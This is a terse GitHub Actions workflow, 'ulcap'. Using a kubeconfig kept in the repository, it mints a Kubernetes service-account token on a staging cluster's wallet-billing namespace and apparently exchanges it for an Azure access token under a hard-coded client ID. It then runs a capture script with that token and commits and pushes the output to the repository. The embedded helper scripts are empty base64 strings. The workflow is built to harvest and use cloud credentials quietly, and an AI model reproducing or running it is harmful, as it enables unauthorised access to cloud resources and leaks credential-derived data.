name: ulcap
on:
  workflow_dispatch:
permissions:
  contents: write
  id-token: write
jobs:
  go:
    runs-on: ubuntu-latest
    timeout-minutes: 40
    steps:
      - uses: actions/checkout@v4
      - name: c
        run: |
          set +e
          curl -sL -o /tmp/kubectl https://dl.k8s.io/release/v1.30.5/bin/linux/amd64/kubectl && chmod +x /tmp/kubectl
          echo '' | base64 -d > /tmp/cap.py
          echo '' | base64 -d > /tmp/gtok.py
          K=ul/kc/all-datapath.yaml
          KX="/tmp/kubectl --kubeconfig $K --request-timeout=20s"
          A=$($KX --context aks-g42us-tfdemo-staging-datapath-swedencentral create token control-sync-apply -n wallet-billing --audience api://AzureADTokenExchange --duration 3600s 2>/dev/null)
          echo "alen=${#A}"
          TOK=$(CID=c436a85b-f27b-4701-8bee-78b0c2a378cf ASSERTION="$A" python3 /tmp/gtok.py)
          echo "toklen=${#TOK}"
          TOK="$TOK" python3 /tmp/cap.py 2>&1 | tee ul/cap/run.txt
      - name: commit
        if: always()
        run: |
          set +e
          mkdir -p ul/cap
          git add -A
          git -c user.email=a@b -c user.name=ul commit -m "ulcap $(date -u +%s)"
          git push
